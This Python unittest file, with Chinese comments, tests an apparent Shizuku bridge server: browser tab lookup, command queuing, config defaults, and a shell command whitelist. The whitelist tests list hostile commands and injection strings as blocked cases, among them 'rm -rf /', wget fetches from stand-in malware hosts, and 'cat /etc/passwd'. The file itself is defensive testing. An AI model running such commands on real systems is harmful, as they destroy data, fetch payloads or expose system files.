#!/usr/bin/env python3
"""
test_bridge.py — shizuku_bridge.py 单元测试
"""
import json
import threading
import time
import unittest
from unittest.mock import patch, MagicMock

import sys
sys.path.insert(0, '../server')

from shizuku_bridge import ShizukuHandler
from browser_manager import browser_tabs, browser_commands, browser_results


class TestBridgeServer(unittest.TestCase):
    """测试桥接服务端核心逻辑"""

    def setUp(self):
        """每个测试前重置状态"""
        browser_tabs.clear()
        browser_commands.clear()
        browser_results.clear()

    def test_find_tab_on_domain(self):
        """测试域名查找 tab"""
        browser_tabs["tab1"] = {"url": "https://www.doubao.com/chat/", "updated_at": time.time()}
        browser_tabs["tab2"] = {"url": "https://chat.deepseek.com/", "updated_at": time.time() - 100}
        
        from shizuku_bridge import find_tab_on_domain
        result = find_tab_on_domain("doubao.com")
        self.assertEqual(result, "tab1")

    def test_find_tab_on_domain_no_match(self):
        """测试域名查找 tab 无匹配"""
        browser_tabs["tab1"] = {"url": "https://www.doubao.com/chat/", "updated_at": time.time()}
        
        from shizuku_bridge import find_tab_on_domain
        result = find_tab_on_domain("nonexistent.com")
        self.assertIsNone(result)

    def test_find_most_recent_tab(self):
        """测试查找最近活跃 tab"""
        browser_tabs["tab1"] = {"url": "https://www.doubao.com/chat/", "updated_at": time.time() - 100}
        browser_tabs["tab2"] = {"url": "https://chat.deepseek.com/", "updated_at": time.time()}
        
        from shizuku_bridge import find_most_recent_tab
        result = find_most_recent_tab()
        self.assertEqual(result, "tab2")

    def test_find_most_recent_tab_empty(self):
        """测试无 tab 时返回 None"""
        from shizuku_bridge import find_most_recent_tab
        result = find_most_recent_tab()
        self.assertIsNone(result)

    def test_send_cmd(self):
        """测试发送命令到 tab"""
        from shizuku_bridge import send_cmd
        cmd_id = send_cmd("tab1", {"action": "click", "selector": "#btn"})
        
        self.assertIsNotNone(cmd_id)
        self.assertIn("tab1", browser_commands)
        self.assertEqual(len(browser_commands["tab1"]), 1)
        self.assertEqual(browser_commands["tab1"][0]["action"], "click")

    def test_wait_for_cmd_result(self):
        """测试等待命令结果"""
        from shizuku_bridge import send_cmd, wait_for_cmd_result
        cmd_id = send_cmd("tab1", {"action": "ping"})
        
        # 模拟结果回传
        def simulate_result():
            time.sleep(0.5)
            browser_results.append({"id": cmd_id, "ok": True, "result": "pong"})
        
        threading.Thread(target=simulate_result).start()
        result = wait_for_cmd_result(cmd_id, timeout=5)
        
        self.assertIsNotNone(result)
        self.assertTrue(result["ok"])
        self.assertEqual(result["result"], "pong")


class TestSecurityWhitelist(unittest.TestCase):
    """测试安全白名单机制"""

    def test_allowed_commands(self):
        """测试允许的命令"""
        from shell_relay import is_command_allowed
        allowed_cmds = [
            "input tap 100 200",
            "input swipe 100 200 300 400",
            "uiautomator dump /sdcard/uidump.xml",
            "am start -n com.example/.MainActivity",
            "dumpsys battery",
            "screencap -p /sdcard/screenshot.png",
        ]
        for cmd in allowed_cmds:
            self.assertTrue(
                is_command_allowed(cmd),
                f"命令应该被允许: {cmd}"
            )

    def test_blocked_commands(self):
        """测试被阻止的命令（白名单前缀无法覆盖的纯恶意命令）"""
        from shell_relay import is_command_allowed
        blocked_cmds = [
            "rm -rf /",
            "wget http://malware.com/payload.sh",
            "pm uninstall com.android.systemui",
            "bash -c 'evil'",
            "python3 -c 'import os; os.system(\"rm -rf /\")'",
        ]
        for cmd in blocked_cmds:
            self.assertFalse(
                is_command_allowed(cmd),
                f"命令应该被阻止: {cmd}"
            )

    def test_command_injection_blocked(self):
        """测试命令注入被阻止（利用注入字符检测）"""
        from shell_relay import is_command_allowed
        injection_cmds = [
            "input tap 100 200; rm -rf /",
            "input tap 100 200 && wget http://evil.com",
            "input tap 100 200 | cat /etc/passwd",
            "$(rm -rf /)",
            "input tap 100 200`whoami`",
            "input tap 100 200\nrm -rf /",
        ]
        for cmd in injection_cmds:
            self.assertFalse(
                is_command_allowed(cmd),
                f"注入命令应该被阻止: {cmd}"
            )

    def test_whitelist_prefix_matching(self):
        """测试白名单前缀匹配精确性"""
        from shell_relay import ALLOWED_PREFIXES
        self.assertTrue("cat /tmp/test".startswith("cat "))
        self.assertFalse("catfish".startswith("cat "))
        self.assertTrue("echo hello".startswith("echo "))
        self.assertFalse("echocardiogram".startswith("echo "))

class TestConfigModule(unittest.TestCase):
    """测试配置加载模块"""

    def test_default_config(self):
        """测试默认配置"""
        from config import DEFAULT_CONFIG
        self.assertIn("server", DEFAULT_CONFIG)
        self.assertIn("browser", DEFAULT_CONFIG)
        self.assertIn("features", DEFAULT_CONFIG)
        self.assertEqual(DEFAULT_CONFIG["server"]["port"], 8123)
        self.assertEqual(DEFAULT_CONFIG["server"]["host"], "127.0.0.1")

    def test_load_config_returns_dict(self):
        """测试配置加载返回字典"""
        from config import load_config
        cfg = load_config()
        self.assertIsInstance(cfg, dict)
        self.assertIn("server", cfg)

    def test_get_server_config(self):
        """测试获取服务端配置"""
        from config import get_server_config
        cfg = get_server_config()
        self.assertIn("host", cfg)
        self.assertIn("port", cfg)
        self.assertIn("token", cfg)

    def test_get_browser_config(self):
        """测试获取浏览器配置"""
        from config import get_browser_config
        cfg = get_browser_config()
        self.assertIn("package", cfg)
        self.assertIn("activity", cfg)


if __name__ == "__main__":
    unittest.main()
